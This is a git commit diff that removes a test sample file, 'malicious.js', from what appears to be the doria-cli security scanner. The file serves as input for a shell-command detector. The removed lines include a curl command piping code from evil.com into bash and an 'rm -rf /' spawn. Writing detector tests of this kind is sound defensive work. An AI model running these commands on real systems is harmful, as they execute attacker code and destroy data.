53ed13cb48643979b6d0ab36c6b1b263d93ab45e
Elvis Chege <96030189+elviscgn@users.noreply.github.com>
2026-03-28 07:15:55 +0200

    test js proj

--- doria-cli/test_samples/malicious.js
+++
@@ -1,9 +0,0 @@
-const child_process = require('child_process');
-
-// This should trigger ShellDetector
-child_process.exec('curl http://evil.com | bash');
-child_process.spawn('rm', ['-rf', '/']);
-
-// This should be clean
-const x = 1 + 1;
-console.log(x);
